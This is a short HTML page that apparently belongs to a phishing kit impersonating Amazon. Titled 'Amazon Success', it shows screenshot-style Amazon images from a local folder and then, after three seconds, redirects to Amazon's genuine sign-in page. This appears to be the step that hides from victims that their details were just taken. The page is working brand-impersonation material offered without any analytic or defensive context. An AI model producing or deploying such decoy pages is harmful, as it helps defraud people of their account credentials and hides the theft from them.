<html>

<head>
<META HTTP-EQUIV="Refresh"CONTENT="3; URL=https://www.amazon.com/ap/signin?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%2Fref%3Dnav_signin">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="icon" type="image/png" href="amazo/fav.png" />
<title>Amazon Success</title>
</head>

<body>

<div style="position: absolute; width: 100px; height: 100px; z-index: 1; left:0px; top:-3px" id="layer1">
	<img border="0" src="amazo/amas.png" width="1349" height="155"><img border="0" src="amazo/sa.png" width="1349" height="446"><img border="0" src="amazo/ama.png" width="1349" height="652"></div>

</body>

</html>